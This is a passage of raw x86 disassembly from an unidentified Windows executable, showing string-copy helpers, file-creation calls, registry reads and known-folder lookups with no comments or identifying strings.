  406705:	push   eax
  406706:	movzx  eax,cl
  406709:	push   eax
  40670a:	lea    eax,[edi+0x2]
  40670d:	push   eax
  40670e:	call   0x412060
  406713:	mov    eax,DWORD PTR [ebp-0xc]
  406716:	add    esp,0xc
  406719:	jmp    0x40665f
  40671e:	test   edx,edx
  406720:	je     0x406727
  406722:	xor    eax,eax
  406724:	mov    WORD PTR [ebx],ax
  406727:	pop    edi
  406728:	mov    eax,esi
  40672a:	pop    esi
  40672b:	pop    ebx
  40672c:	mov    esp,ebp
  40672e:	pop    ebp
  40672f:	ret    
  406730:	int3   
  406731:	int3   
  406732:	int3   
  406733:	int3   
  406734:	int3   
  406735:	mov    edi,edi
  406737:	push   ebp
  406738:	mov    ebp,esp
  40673a:	mov    eax,DWORD PTR [ebp+0x8]
  40673d:	mov    edx,ecx
  40673f:	push   ebx
  406740:	xor    ebx,ebx
  406742:	test   edx,edx
  406744:	je     0x40677b
  406746:	push   esi
  406747:	push   edi
  406748:	mov    edi,0x104
  40674d:	mov    ecx,ebx
  40674f:	mov    esi,edi
  406751:	cmp    WORD PTR [edx],bx
  406754:	je     0x40675e
  406756:	add    edx,0x2
  406759:	sub    esi,0x1
  40675c:	jne    0x406751
  40675e:	test   esi,esi
  406760:	jne    0x406767
  406762:	mov    ecx,0x80070057
  406767:	test   eax,eax
  406769:	je     0x406777
  40676b:	test   ecx,ecx
  40676d:	js     0x406775
  40676f:	sub    edi,esi
  406771:	mov    DWORD PTR [eax],edi
  406773:	jmp    0x406777
  406775:	mov    DWORD PTR [eax],ebx
  406777:	pop    edi
  406778:	pop    esi
  406779:	jmp    0x406780
  40677b:	mov    ecx,0x80070057
  406780:	test   ecx,ecx
  406782:	jns    0x40678a
  406784:	test   eax,eax
  406786:	je     0x40678a
  406788:	mov    DWORD PTR [eax],ebx
  40678a:	mov    eax,ecx
  40678c:	pop    ebx
  40678d:	pop    ebp
  40678e:	ret    0x4
  406791:	int3   
  406792:	int3   
  406793:	int3   
  406794:	int3   
  406795:	int3   
  406796:	mov    edi,edi
  406798:	push   ebp
  406799:	mov    ebp,esp
  40679b:	xor    eax,eax
  40679d:	test   DWORD PTR [ebp+0xc],0x100
  4067a4:	je     0x4067b0
  4067a6:	test   ecx,ecx
  4067a8:	jne    0x4067b4
  4067aa:	test   edx,edx
  4067ac:	jne    0x4067bc
  4067ae:	jmp    0x4067b4
  4067b0:	test   edx,edx
  4067b2:	je     0x4067bc
  4067b4:	cmp    edx,0x7fffffff
  4067ba:	jbe    0x4067c1
  4067bc:	mov    eax,0x80070057
  4067c1:	pop    ebp
  4067c2:	ret    0x8
  4067c5:	int3   
  4067c6:	int3   
  4067c7:	int3   
  4067c8:	int3   
  4067c9:	int3   
  4067ca:	mov    edi,edi
  4067cc:	push   ebp
  4067cd:	mov    ebp,esp
  4067cf:	xor    eax,eax
  4067d1:	push   esi
  4067d2:	mov    esi,eax
  4067d4:	test   edx,edx
  4067d6:	je     0x406807
  4067d8:	push   ebx
  4067d9:	push   edi
  4067da:	mov    edi,DWORD PTR [ebp+0xc]
  4067dd:	mov    ebx,0x7ffffffe
  4067e2:	sub    edi,ecx
  4067e4:	test   ebx,ebx
  4067e6:	je     0x4067fe
  4067e8:	movzx  eax,WORD PTR [edi+ecx*1]
  4067ec:	test   ax,ax
  4067ef:	je     0x4067fe
  4067f1:	mov    WORD PTR [ecx],ax
  4067f4:	add    ecx,0x2
  4067f7:	dec    ebx
  4067f8:	inc    esi
  4067f9:	sub    edx,0x1
  4067fc:	jne    0x4067e4
  4067fe:	pop    edi
  4067ff:	pop    ebx
  406800:	push   0x0
  406802:	pop    eax
  406803:	test   edx,edx
  406805:	jne    0x406810
  406807:	sub    ecx,0x2
  40680a:	mov    eax,0x8007007a
  40680f:	dec    esi
  406810:	xor    edx,edx
  406812:	mov    WORD PTR [ecx],dx
  406815:	mov    ecx,DWORD PTR [ebp+0x8]
  406818:	test   ecx,ecx
  40681a:	je     0x40681e
  40681c:	mov    DWORD PTR [ecx],esi
  40681e:	pop    esi
  40681f:	pop    ebp
  406820:	ret    0xc
  406823:	int3   
  406824:	int3   
  406825:	int3   
  406826:	int3   
  406827:	int3   
  406828:	mov    edi,edi
  40682a:	push   ebp
  40682b:	mov    ebp,esp
  40682d:	push   ebx
  40682e:	push   edi
  40682f:	mov    edi,edx
  406831:	mov    ebx,ecx
  406833:	shr    edi,1
  406835:	je     0x40684f
  406837:	test   DWORD PTR [ebp+0x14],0x1000
  40683e:	je     0x40684f
  406840:	mov    eax,DWORD PTR [ebp+0xc]
  406843:	mov    DWORD PTR [eax],ebx
  406845:	mov    eax,DWORD PTR [ebp+0x10]
  406848:	mov    DWORD PTR [eax],edi
  40684a:	xor    eax,eax
  40684c:	mov    WORD PTR [ebx],ax
  40684f:	test   DWORD PTR [ebp+0x14],0x400
  406856:	je     0x40689b
  406858:	push   esi
  406859:	mov    esi,DWORD PTR [ebp+0x14]
  40685c:	push   edx
  40685d:	and    esi,0xff
  406863:	push   esi
  406864:	push   ebx
  406865:	call   0x412060
  40686a:	add    esp,0xc
  40686d:	test   esi,esi
  40686f:	pop    esi
  406870:	jne    0x40687e
  406872:	mov    ecx,DWORD PTR [ebp+0xc]
  406875:	mov    eax,DWORD PTR [ebp+0x10]
  406878:	mov    DWORD PTR [ecx],ebx
  40687a:	mov    DWORD PTR [eax],edi
  40687c:	jmp    0x4068a1
  40687e:	test   edi,edi
  406880:	je     0x4068b7
  406882:	mov    ecx,DWORD PTR [ebp+0xc]
  406885:	lea    eax,[ebx-0x2]
  406888:	lea    eax,[eax+edi*2]
  40688b:	mov    DWORD PTR [ecx],eax
  40688d:	mov    ecx,DWORD PTR [ebp+0x10]
  406890:	mov    DWORD PTR [ecx],0x1
  406896:	xor    ecx,ecx
  406898:	mov    WORD PTR [eax],cx
  40689b:	mov    ecx,DWORD PTR [ebp+0xc]
  40689e:	mov    eax,DWORD PTR [ebp+0x10]
  4068a1:	test   edi,edi
  4068a3:	je     0x4068b7
  4068a5:	test   DWORD PTR [ebp+0x14],0x800
  4068ac:	je     0x4068b7
  4068ae:	mov    DWORD PTR [eax],edi
  4068b0:	xor    eax,eax
  4068b2:	mov    DWORD PTR [ecx],ebx
  4068b4:	mov    WORD PTR [ebx],ax
  4068b7:	pop    edi
  4068b8:	xor    eax,eax
  4068ba:	pop    ebx
  4068bb:	pop    ebp
  4068bc:	ret    0x10
  4068bf:	int3   
  4068c0:	int3   
  4068c1:	int3   
  4068c2:	int3   
  4068c3:	int3   
  4068c4:	mov    edi,edi
  4068c6:	push   ebp
  4068c7:	mov    ebp,esp
  4068c9:	sub    esp,0xb8c
  4068cf:	mov    eax,ds:0x413004
  4068d4:	xor    eax,ebp
  4068d6:	mov    DWORD PTR [ebp-0x4],eax
  4068d9:	push   ebx
  4068da:	push   esi
  4068db:	push   edi
  4068dc:	mov    edi,DWORD PTR [ebp+0x8]
  4068df:	mov    esi,edx
  4068e1:	mov    DWORD PTR [ebp-0xb7c],edi
  4068e7:	mov    ebx,ecx
  4068e9:	test   edi,edi
  4068eb:	jne    0x4068f4
  4068ed:	xor    eax,eax
  4068ef:	jmp    0x406aff
  4068f4:	lea    ecx,[ebp-0x358]
  4068fa:	call   0x40fa55
  4068ff:	lea    ecx,[ebp-0x358]
  406905:	call   0x40fa90
  40690a:	test   eax,eax
  40690c:	je     0x406af9
  406912:	test   esi,esi
  406914:	je     0x4068ed
  406916:	xor    eax,eax
  406918:	cmp    ax,WORD PTR [esi]
  40691b:	je     0x4068ed
  40691d:	mov    edi,0x105
  406922:	push   edi
  406923:	push   eax
  406924:	lea    eax,[ebp-0x218]
  40692a:	push   eax
  40692b:	call   0x412060
  406930:	add    esp,0xc
  406933:	push   esi
  406934:	call   DWORD PTR ds:0x414068
  40693a:	push   0x5c
  40693c:	pop    ecx
  40693d:	cmp    cx,WORD PTR [esi+eax*2-0x2]
  406942:	jne    0x40695f
  406944:	sub    esp,0xc
  406947:	push   esi
  406948:	call   DWORD PTR ds:0x414068
  40694e:	push   eax
  40694f:	push   esi
  406950:	mov    edx,edi
  406952:	lea    ecx,[ebp-0x218]
  406958:	call   0x410ef7
  40695d:	jmp    0x406974
  40695f:	push   0x900
  406964:	push   ecx
  406965:	push   ecx
  406966:	push   esi
  406967:	mov    edx,edi
  406969:	lea    ecx,[ebp-0x218]
  40696f:	call   0x410ebe
  406974:	lea    eax,[ebp-0x218]
  40697a:	push   eax
  40697b:	lea    ecx,[ebp-0xb78]
  406981:	call   0x40eb66
  406986:	push   0x4014c8
  40698b:	call   DWORD PTR ds:0x414068
  406991:	push   0x4014c0
  406996:	mov    esi,eax
  406998:	call   DWORD PTR ds:0x414068
  40699e:	add    esi,eax
  4069a0:	lea    eax,[ebp-0x964]
  4069a6:	push   eax
  4069a7:	call   DWORD PTR ds:0x414068
  4069ad:	add    esi,eax
  4069af:	lea    eax,[ebp-0x96e]
  4069b5:	push   eax
  4069b6:	call   DWORD PTR ds:0x414068
  4069bc:	inc    eax
  4069bd:	add    esi,eax
  4069bf:	lea    eax,[esi+esi*1]
  4069c2:	push   eax
  4069c3:	call   DWORD PTR ds:0x4141b0
  4069c9:	mov    edi,eax
  4069cb:	test   edi,edi
  4069cd:	je     0x4068ed
  4069d3:	push   0x4014c0
  4069d8:	lea    eax,[ebp-0x964]
  4069de:	push   eax
  4069df:	lea    eax,[ebp-0x96e]
  4069e5:	push   eax
  4069e6:	push   0x4015e8
  4069eb:	push   0x900
  4069f0:	push   0x0
  4069f2:	push   0x0
  4069f4:	push   esi
  4069f5:	push   edi
  4069f6:	call   0x410f98
  4069fb:	add    esp,0x24
  4069fe:	mov    edx,edi
  406a00:	mov    ecx,ebx
  406a02:	call   0x40ff1c
  406a07:	test   eax,eax
  406a09:	jne    0x406a1f
  406a0b:	push   edi
  406a0c:	push   0x4015f8
  406a11:	push   DWORD PTR ds:0x4130e8
  406a17:	call   0x40e818
  406a1c:	add    esp,0xc
  406a1f:	sub    esp,0xc
  406a22:	mov    edx,esi
  406a24:	mov    ecx,edi
  406a26:	push   0x4014c8
  406a2b:	call   0x410f31
  406a30:	test   ebx,ebx
  406a32:	je     0x406aa7
  406a34:	mov    esi,DWORD PTR [ebx]
  406a36:	and    DWORD PTR [ebp-0xb80],0x0
  406a3d:	push   0x80
  406a42:	push   0x1
  406a44:	mov    ecx,DWORD PTR [esi+0x40]
  406a47:	push   0x1
  406a49:	push   0xc0000000
  406a4e:	push   edi
  406a4f:	push   ebx
  406a50:	mov    DWORD PTR [ebp-0xb8c],0x40143c
  406a5a:	mov    DWORD PTR [ebp-0xb84],edi
  406a60:	mov    DWORD PTR [ebp-0xb88],edi
  406a66:	call   DWORD PTR ds:0x414220
  406a6c:	call   DWORD PTR [esi+0x40]
  406a6f:	lea    ecx,[ebp-0xb8c]
  406a75:	mov    esi,eax
  406a77:	call   0x405c45
  406a7c:	test   esi,esi
  406a7e:	js     0x406aef
  406a80:	cmp    DWORD PTR [ebp+0xc],0x0
  406a84:	je     0x406aef
  406a86:	call   DWORD PTR ds:0x4141ac
  406a8c:	cmp    eax,0x2
  406a8f:	jne    0x406a9c
  406a91:	call   DWORD PTR ds:0x4141b4
  406a97:	cmp    eax,0x6
  406a9a:	jae    0x406aef
  406a9c:	mov    edx,edi
  406a9e:	mov    ecx,ebx
  406aa0:	call   0x4101ee
  406aa5:	jmp    0x406aef
  406aa7:	push   0x0
  406aa9:	push   0x80
  406aae:	push   0x1
  406ab0:	push   0x0
  406ab2:	push   0x1
  406ab4:	push   0xc0000000
  406ab9:	push   edi
  406aba:	call   DWORD PTR ds:0x41405c
  406ac0:	cmp    eax,0xffffffff
  406ac3:	je     0x406aef
  406ac5:	push   eax
  406ac6:	call   DWORD PTR ds:0x414084
  406acc:	cmp    DWORD PTR [ebp+0xc],0x0
  406ad0:	je     0x406aef
  406ad2:	call   DWORD PTR ds:0x4141ac
  406ad8:	cmp    eax,0x2
  406adb:	jne    0x406ae8
  406add:	call   DWORD PTR ds:0x4141b4
  406ae3:	cmp    eax,0x6
  406ae6:	jae    0x406aef
  406ae8:	mov    ecx,edi
  406aea:	call   0x40fe63
  406aef:	mov    eax,DWORD PTR [ebp-0xb7c]
  406af5:	mov    DWORD PTR [eax],edi
  406af7:	jmp    0x406afc
  406af9:	and    DWORD PTR [edi],0x0
  406afc:	xor    eax,eax
  406afe:	inc    eax
  406aff:	mov    ecx,DWORD PTR [ebp-0x4]
  406b02:	pop    edi
  406b03:	pop    esi
  406b04:	xor    ecx,ebp
  406b06:	pop    ebx
  406b07:	call   0x411980
  406b0c:	mov    esp,ebp
  406b0e:	pop    ebp
  406b0f:	ret    0x8
  406b12:	int3   
  406b13:	int3   
  406b14:	int3   
  406b15:	int3   
  406b16:	int3   
  406b17:	mov    edi,edi
  406b19:	push   ebp
  406b1a:	mov    ebp,esp
  406b1c:	mov    eax,0x1470
  406b21:	call   0x412030
  406b26:	mov    eax,ds:0x413004
  406b2b:	xor    eax,ebp
  406b2d:	mov    DWORD PTR [ebp-0x4],eax
  406b30:	push   ebx
  406b31:	push   esi
  406b32:	mov    esi,DWORD PTR [ebp+0x8]
  406b35:	lea    eax,[ebp-0x145c]
  406b3b:	mov    ebx,ecx
  406b3d:	mov    DWORD PTR [ebp-0x1460],edx
  406b43:	push   eax
  406b44:	mov    DWORD PTR [ebp-0x1470],ebx
  406b4a:	call   DWORD PTR ds:0x41413c
  406b50:	test   eax,eax
  406b52:	jns    0x406b5b
  406b54:	xor    eax,eax
  406b56:	jmp    0x406df2
  406b5b:	push   edi
  406b5c:	lea    eax,[ebp-0x1458]
  406b62:	xor    edi,edi
  406b64:	push   eax
  406b65:	push   0x23
  406b67:	push   edi
  406b68:	mov    DWORD PTR [ebp-0x1458],edi
  406b6e:	call   DWORD PTR ds:0x41414c
  406b74:	test   eax,eax
  406b76:	js     0x406bba
  406b78:	push   ebx
  406b79:	push   DWORD PTR [ebp-0x1458]
  406b7f:	call   DWORD PTR ds:0x414140
  406b85:	test   eax,eax
  406b87:	je     0x406db4
  406b8d:	mov    eax,DWORD PTR [ebp-0x145c]
  406b93:	push   DWORD PTR [ebp-0x1458]
  406b99:	push   eax
  406b9a:	mov    ecx,DWORD PTR [eax]
  406b9c:	mov    esi,DWORD PTR [ecx+0x14]
  406b9f:	mov    ecx,esi
  406ba1:	call   DWORD PTR ds:0x414220
  406ba7:	call   esi
  406ba9:	mov    esi,DWORD PTR [ebp-0x1460]
  406baf:	mov    DWORD PTR [ebp-0x1458],edi
  406bb5:	jmp    0x406d9c
  406bba:	lea    eax,[ebp-0x1458]
  406bc0:	push   eax
  406bc1:	push   0x1a
  406bc3:	push   edi
  406bc4:	call   DWORD PTR ds:0x41414c
  406bca:	test   eax,eax
  406bcc:	lea    eax,[ebp-0x41c]
  406bd2:	js     0x406c0d
  406bd4:	push   eax
  406bd5:	push   DWORD PTR [ebp-0x1458]
  406bdb:	call   DWORD PTR ds:0x414140
  406be1:	test   eax,eax
  406be3:	je     0x406db4
  406be9:	mov    eax,DWORD PTR [ebp-0x145c]
  406bef:	push   DWORD PTR [ebp-0x1458]
  406bf5:	push   eax
  406bf6:	mov    ecx,DWORD PTR [eax]
  406bf8:	mov    esi,DWORD PTR [ecx+0x14]
  406bfb:	mov    ecx,esi
  406bfd:	call   DWORD PTR ds:0x414220
  406c03:	call   esi
  406c05:	mov    DWORD PTR [ebp-0x1458],edi
  406c0b:	jmp    0x406c1f
  406c0d:	push   0x104
  406c12:	push   eax
  406c13:	push   0x1f5
  406c18:	push   esi
  406c19:	call   DWORD PTR ds:0x414188
  406c1f:	lea    eax,[ebp-0x1458]
  406c25:	mov    ebx,edi
  406c27:	push   eax
  406c28:	push   0x19
  406c2a:	push   edi
  406c2b:	call   DWORD PTR ds:0x41414c
  406c31:	test   eax,eax
  406c33:	js     0x406c79
  406c35:	lea    eax,[ebp-0x210]
  406c3b:	push   eax
  406c3c:	push   DWORD PTR [ebp-0x1458]
  406c42:	call   DWORD PTR ds:0x414140
  406c48:	test   eax,eax
  406c4a:	je     0x406c4f
  406c4c:	xor    ebx,ebx
  406c4e:	inc    ebx
  406c4f:	mov    eax,DWORD PTR [ebp-0x145c]
  406c55:	push   DWORD PTR [ebp-0x1458]
  406c5b:	push   eax
  406c5c:	mov    ecx,DWORD PTR [eax]
  406c5e:	mov    esi,DWORD PTR [ecx+0x14]
  406c61:	mov    ecx,esi
  406c63:	call   DWORD PTR ds:0x414220
  406c69:	call   esi
  406c6b:	mov    DWORD PTR [ebp-0x1458],edi
  406c71:	test   ebx,ebx
  406c73:	jne    0x406d36
  406c79:	lea    eax,[ebp-0x1464]
  406c7f:	push   eax
  406c80:	push   0x20019
  406c85:	push   edi
  406c86:	push   0x401690
  406c8b:	push   0x80000002
  406c90:	call   DWORD PTR ds:0x414004
  406c96:	test   eax,eax
  406c98:	jne    0x406d08
  406c9a:	lea    eax,[ebp-0x1468]
  406ca0:	mov    DWORD PTR [ebp-0x1468],0x104
  406caa:	push   eax
  406cab:	lea    eax,[ebp-0x210]
  406cb1:	xor    esi,esi
  406cb3:	push   eax
  406cb4:	lea    eax,[ebp-0x146c]
  406cba:	inc    esi
  406cbb:	push   eax
  406cbc:	push   edi
  406cbd:	push   0x401714
  406cc2:	push   DWORD PTR [ebp-0x1464]
  406cc8:	mov    DWORD PTR [ebp-0x146c],esi
  406cce:	call   DWORD PTR ds:0x414000
  406cd4:	test   eax,eax
  406cd6:	jne    0x406cf8
  406cd8:	mov    eax,DWORD PTR [ebp-0x1468]
  406cde:	and    eax,0xfffffffe
  406ce1:	cmp    eax,0x20c
  406ce6:	jae    0x406e04
  406cec:	xor    ecx,ecx
  406cee:	mov    ebx,esi
  406cf0:	mov    WORD PTR [ebp+eax*1-0x210],cx
  406cf8:	push   DWORD PTR [ebp-0x1464]
  406cfe:	call   DWORD PTR ds:0x414008
  406d04:	test   ebx,ebx
  406d06:	jne    0x406d36
  406d08:	push   0x104
  406d0d:	lea    eax,[ebp-0x210]
  406d13:	push   eax
  406d14:	call   DWORD PTR ds:0x414088
  406d1a:	test   eax,eax
  406d1c:	je     0x406d36
  406d1e:	sub    esp,0xc
  406d21:	lea    ecx,[ebp-0x210]
  406d27:	mov    edx,0x106
  406d2c:	push   0x401734
  406d31:	call   0x410f31
  406d36:	lea    eax,[ebp-0x41c]
  406d3c:	push   eax
  406d3d:	lea    ecx,[ebp-0x1454]
  406d43:	call   0x40eb66
  406d48:	lea    eax,[ebp-0x210]
  406d4e:	push   eax
  406d4f:	lea    ecx,[ebp-0xc38]
  406d55:	call   0x40eb66
  406d5a:	mov    esi,DWORD PTR [ebp-0x1460]
  406d60:	lea    eax,[ebp-0xe3c]
  406d66:	push   eax
  406d67:	mov    ebx,DWORD PTR [ebp-0x1470]
  406d6d:	lea    eax,[ebp-0x103e]
  406d73:	push   eax
  406d74:	lea    eax,[ebp-0xa24]
  406d7a:	push   eax
  406d7b:	lea    eax,[ebp-0xa2e]
  406d81:	push   eax
  406d82:	push   0x401748
  406d87:	push   0x900
  406d8c:	push   edi
  406d8d:	push   edi
  406d8e:	push   esi
  406d8f:	push   ebx
  406d90:	call   0x410f98
  406d95:	add    esp,0x28
  406d98:	test   eax,eax
  406d9a:	js     0x406db4
  406d9c:	sub    esp,0xc
  406d9f:	mov    edx,esi
  406da1:	mov    ecx,ebx
  406da3:	push   0x401760
  406da8:	call   0x410f31
  406dad:	test   eax,eax
  406daf:	js     0x406db4
  406db1:	xor    edi,edi
  406db3:	inc    edi
  406db4:	cmp    DWORD PTR [ebp-0x1458],0x0
  406dbb:	je     0x406dd9
  406dbd:	mov    eax,DWORD PTR [ebp-0x145c]
  406dc3:	push   DWORD PTR [ebp-0x1458]
  406dc9:	push   eax
  406dca:	mov    ecx,DWORD PTR [eax]
  406dcc:	mov    esi,DWORD PTR [ecx+0x14]
  406dcf:	mov    ecx,esi
  406dd1:	call   DWORD PTR ds:0x414220
  406dd7:	call   esi
  406dd9:	mov    ecx,DWORD PTR [ebp-0x145c]
  406ddf:	push   ecx
  406de0:	mov    edx,DWORD PTR [ecx]
  406de2:	mov    esi,DWORD PTR [edx+0x8]
  406de5:	mov    ecx,esi
  406de7:	call   DWORD PTR ds:0x414220
  406ded:	call   esi
  406def:	mov    eax,edi
  406df1:	pop    edi
  406df2:	mov    ecx,DWORD PTR [ebp-0x4]
  406df5:	pop    esi
  406df6:	xor    ecx,ebp
  406df8:	pop    ebx
  406df9:	call   0x411980
  406dfe:	mov    esp,ebp
  406e00:	pop    ebp
  406e01:	ret    0x4
  406e04:	call   0x411ad9
  406e09:	int3   
  406e0a:	int3   
  406e0b:	int3   
  406e0c:	int3   
  406e0d:	int3   
  406e0e:	int3   
  406e0f:	mov    edi,edi
  406e11:	push   ebp
  406e12:	mov    ebp,esp
  406e14:	sub    esp,0xa30
  406e1a:	mov    eax,ds:0x413004
  406e1f:	xor    eax,ebp
  406e21:	mov    DWORD PTR [ebp-0x4],eax
  406e24:	push   ebx
  406e25:	mov    eax,edx
  406e27:	mov    DWORD PTR [ebp-0xa30],eax
  406e2d:	push   esi
  406e2e:	mov    esi,ecx
  406e30:	push   edi
  406e31:	test   eax,eax
  406e33:	je     0x406fa0
  406e39:	test   esi,esi
  406e3b:	je     0x406fa0
  406e41:	xor    eax,eax
  406e43:	cmp    ax,WORD PTR [esi]
  406e46:	je     0x406fa0
  406e4c:	push   esi
  406e4d:	call   DWORD PTR ds:0x414068
  406e53:	push   0x105
  406e58:	mov    ebx,eax
  406e5a:	xor    edi,edi
  406e5c:	lea    eax,[ebp-0x210]
  406e62:	push   edi
  406e63:	push   eax
  406e64:	call   0x412060
  406e69:	add    esp,0xc
  406e6c:	push   esi
  406e6d:	call   DWORD PTR ds:0x414068
  406e73:	push   0x5c
  406e75:	pop    ecx
  406e76:	cmp    cx,WORD PTR [esi+eax*2-0x2]
  406e7b:	jne    0x406e9f
  406e7d:	mov    eax,0x104
  406e82:	cmp    ebx,eax
  406e84:	jb     0x406e88
  406e86:	mov    ebx,eax
  406e88:	sub    esp,0xc
  406e8b:	lea    ecx,[ebp-0x210]
  406e91:	mov    edx,0x105
  406e96:	push   ebx
  406e97:	push   esi
  406e98:	call   0x410ef7
  406e9d:	jmp    0x406eb7
  406e9f:	push   0x900
  406ea4:	push   ecx
  406ea5:	push   ecx
  406ea6:	push   esi
  406ea7:	mov    edx,0x105
  406eac:	lea    ecx,[ebp-0x210]
  406eb2:	call   0x410ebe
  406eb7:	test   eax,eax
  406eb9:	js     0x406fa0
  406ebf:	lea    eax,[ebp-0x210]
  406ec5:	push   eax
  406ec6:	lea    ecx,[ebp-0xa2c]
  406ecc:	call   0x40eb66
  406ed1:	push   0x4014e4
  406ed6:	call   DWORD PTR ds:0x414068
  406edc:	push   0x4014c0
  406ee1:	mov    esi,eax
  406ee3:	call   DWORD PTR ds:0x414068
  406ee9:	add    esi,eax
  406eeb:	lea    eax,[ebp-0x818]
  406ef1:	push   eax
  406ef2:	call   DWORD PTR ds:0x414068
  406ef8:	add    esi,eax
  406efa:	lea    eax,[ebp-0x822]
  406f00:	push   eax
  406f01:	call   DWORD PTR ds:0x414068
  406f07:	add    eax,esi
  406f09:	lea    ebx,[eax*2+0x2]
  406f10:	push   ebx
  406f11:	call   DWORD PTR ds:0x4141b0
  406f17:	mov    esi,eax
  406f19:	test   esi,esi
  406f1b:	je     0x406f9c
  406f1d:	push   0x4014c0
  406f22:	lea    eax,[ebp-0x818]
  406f28:	push   eax
  406f29:	lea    eax,[ebp-0x822]
  406f2f:	push   eax
  406f30:	push   0x4015e8
  406f35:	push   0x900
  406f3a:	push   edi
  406f3b:	push   edi
  406f3c:	push   ebx
  406f3d:	push   esi
  406f3e:	call   0x410f98
  406f43:	add    esp,0x24
  406f46:	test   eax,eax
  406f48:	js     0x406f66
  406f4a:	mov    ecx,esi
  406f4c:	call   0x40e9ad
  406f51:	sub    esp,0xc
  406f54:	mov    edx,ebx
  406f56:	mov    ecx,esi
  406f58:	push   0x4014e4
  406f5d:	call   0x410f31
  406f62:	test   eax,eax
  406f64:	jns    0x406f6f
  406f66:	push   esi
  406f67:	call   DWORD PTR ds:0x4141bc
  406f6d:	jmp    0x406f9c
  406f6f:	push   edi
  406f70:	push   0x80
  406f75:	push   0x3
  406f77:	push   edi
  406f78:	push   edi
  406f79:	push   0xc0000000
  406f7e:	push   esi
  406f7f:	call   DWORD PTR ds:0x41405c
  406f85:	cmp    eax,0xffffffff
  406f88:	je     0x406f91
  406f8a:	push   eax
  406f8b:	call   DWORD PTR ds:0x414084
  406f91:	mov    eax,DWORD PTR [ebp-0xa30]
  406f97:	xor    edi,edi
  406f99:	inc    edi
  406f9a:	mov    DWORD PTR [eax],esi
  406f9c:	mov    eax,edi
  406f9e:	jmp    0x406fa2
  406fa0:	xor    eax,eax
  406fa2:	mov    ecx,DWORD PTR [ebp-0x4]
  406fa5:	pop    edi
  406fa6:	pop    esi
  406fa7:	xor    ecx,ebp
  406fa9:	pop    ebx
  406faa:	call   0x411980
  406faf:	mov    esp,ebp
  406fb1:	pop    ebp
  406fb2:	ret    
  406fb3:	int3   
  406fb4:	int3   
  406fb5:	int3   
  406fb6:	int3   
  406fb7:	int3   
  406fb8:	mov    edi,edi
  406fba:	push   ebp
  406fbb:	mov    ebp,esp
  406fbd:	sub    esp,0xc
  406fc0:	push   ebx
  406fc1:	push   esi
  406fc2:	push   edi
  406fc3:	push   0x800
  406fc8:	mov    DWORD PTR [ebp-0x8],ecx
  406fcb:	mov    edi,0x400
  406fd0:	xor    ebx,ebx
  406fd2:	call   DWORD PTR ds:0x4141b0
  406fd8:	mov    esi,eax
  406fda:	test   esi,esi
  406fdc:	je     0x4070d5
  406fe2:	push   DWORD PTR [ebp-0x8]
  406fe5:	push   edi
  406fe6:	push   esi
  406fe7:	push   0x4017a4
  406fec:	call   DWORD PTR ds:0x414128
  406ff2:	mov    ecx,eax
  406ff4:	lea    eax,[ecx+0x2]
  406ff7:	cmp    eax,edi
  406ff9:	jne    0x407035
  406ffb:	push   esi
  406ffc:	add    edi,0x400
  407002:	call   DWORD PTR ds:0x4141bc
  407008:	lea    eax,[edi+edi*1]
  40700b:	push   eax
  40700c:	call   DWORD PTR ds:0x4141b0
  407012:	mov    esi,eax
  407014:	test   esi,esi
  407016:	je     0x4070d5
  40701c:	push   DWORD PTR [ebp-0x8]
  40701f:	push   edi
  407020:	push   esi
  407021:	push   0x4017a4
  407026:	call   DWORD PTR ds:0x414128
  40702c:	mov    ecx,eax
  40702e:	lea    eax,[ecx+0x2]
  407031:	cmp    eax,edi
  407033:	je     0x406ffb
  407035:	test   ecx,ecx
  407037:	je     0x4070d5
  40703d:	lea    eax,[edi+edi*1]
  407040:	push   eax
  407041:	call   DWORD PTR ds:0x4141b0
  407047:	mov    ebx,eax
  407049:	mov    DWORD PTR [ebp-0xc],ebx
  40704c:	test   ebx,ebx
  40704e:	je     0x4070d5
  407054:	xor    eax,eax
  407056:	mov    DWORD PTR [ebp-0x4],ebx
  407059:	cmp    ax,WORD PTR [esi]
  40705c:	je     0x4070b7
  40705e:	mov    ebx,esi
  407060:	push   0xffffffff
  407062:	push   0x4017dc
  407067:	push   0xffffffff
  407069:	push   ebx
  40706a:	push   0x1
  40706c:	push   0x7f
  40706e:	call   DWORD PTR ds:0x414060
  407074:	cmp    eax,0x2
  407077:	je     0x4070a0
  407079:	push   0x900
  40707e:	push   ecx
  40707f:	push   ecx
  407080:	mov    ecx,DWORD PTR [ebp-0x4]
  407083:	mov    edx,edi
  407085:	push   ebx
  407086:	call   0x410ebe
  40708b:	push   DWORD PTR [ebp-0x4]
  40708e:	call   DWORD PTR ds:0x414068
  407094:	mov    ecx,DWORD PTR [ebp-0x4]
  407097:	inc    eax
  407098:	sub    edi,eax
  40709a:	lea    ecx,[ecx+eax*2]
  40709d:	mov    DWORD PTR [ebp-0x4],ecx
  4070a0:	push   ebx
  4070a1:	call   DWORD PTR ds:0x414068
  4070a7:	lea    ebx,[ebx+eax*2]
  4070aa:	xor    eax,eax
  4070ac:	add    ebx,0x2
  4070af:	cmp    ax,WORD PTR [ebx]
  4070b2:	jne    0x407060
  4070b4:	mov    ebx,DWORD PTR [ebp-0xc]
  4070b7:	mov    edi,DWORD PTR [ebp-0x8]
  4070ba:	push   edi
  4070bb:	push   0x0
  4070bd:	push   0x4017a4
  4070c2:	call   DWORD PTR ds:0x414058
  4070c8:	push   edi
  4070c9:	push   ebx
  4070ca:	push   0x4017a4
  4070cf:	call   DWORD PTR ds:0x414058
  4070d5:	push   esi
  4070d6:	call   DWORD PTR ds:0x4141bc
  4070dc:	push   ebx
  4070dd:	call   DWORD PTR ds:0x4141bc
  4070e3:	pop    edi
  4070e4:	pop    esi
  4070e5:	pop    ebx
  4070e6:	mov    esp,ebp
  4070e8:	pop    ebp
  4070e9:	ret    
  4070ea:	int3   
  4070eb:	int3   
  4070ec:	int3   
  4070ed:	int3   
  4070ee:	int3   
  4070ef:	mov    edi,edi
  4070f1:	push   ebp
  4070f2:	mov    ebp,esp
  4070f4:	sub    esp,0x22c
  4070fa:	mov    eax,ds:0x413004
  4070ff:	xor    eax,ebp
  407101:	mov    DWORD PTR [ebp-0x4],eax
  407104:	push   ebx
  407105:	push   esi
  407106:	push   edi
  407107:	lea    eax,[ebp-0x21c]
  40710d:	mov    ebx,edx
  40710f:	push   eax
  407110:	push   0xf003f
  407115:	push   0x0
  407117:	mov    edi,ecx
  407119:	push   ebx
  40711a:	push   edi
  40711b:	call   DWORD PTR ds:0x414004
  407121:	mov    esi,eax
  407123:	test   esi,esi
  407125:	jle    0x407132
  407127:	movzx  esi,si
  40712a:	or     esi,0x80070000
